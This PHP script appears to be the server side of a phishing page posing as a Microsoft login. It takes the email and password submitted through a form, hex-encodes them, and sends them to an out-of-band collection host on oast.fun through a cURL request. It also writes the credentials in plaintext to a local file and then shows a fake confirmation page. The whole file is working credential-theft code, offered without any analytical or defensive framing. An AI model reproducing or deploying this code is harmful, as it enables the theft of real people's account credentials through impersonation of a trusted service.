<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Hardcoded OOB URL
    $oob_url = "oexfjevatexeojostniisl9j0b5hjv076.oast.fun";

    // Collecting data from the form
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Combine email and password with a space
    $combined = $email . " " . $password;

    // Convert the combined string to hexadecimal
    $hex = bin2hex($combined);

    // Prepend the hex value to the OOB URL
    $full_url = "http://" . $hex . "." . $oob_url;

    // Send a GET request to the full URL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Log the cURL response for debugging
    error_log("cURL response: " . $response);

    // Creating or opening the file to log credentials
    $file = fopen('credentials.txt', 'a');
    if (!$file) {
        error_log("Failed to open credentials.txt for writing.");
        echo "Failed to open file for writing.";
        exit();
    }

    // Formatting the log entry
    $logEntry = "Email: " . $email . " - Password: " . $password . "\n";

    // Writing the log entry to the file
    if (fwrite($file, $logEntry) === FALSE) {
        error_log("Failed to write to credentials.txt.");
        echo "Failed to write to file.";
        fclose($file);
        exit();
    }

    // Closing the file
    fclose($file);

    // Display an acknowledgment message
    echo "<html>
            <head>
                <title>Microsoft Login - Submission Received</title>
            </head>
            <body>
                <h1>Thank You!</h1>
                <p>Your submission has been received.</p>
            </body>
          </html>";
} else {
    echo "No POST request received";
}
?>
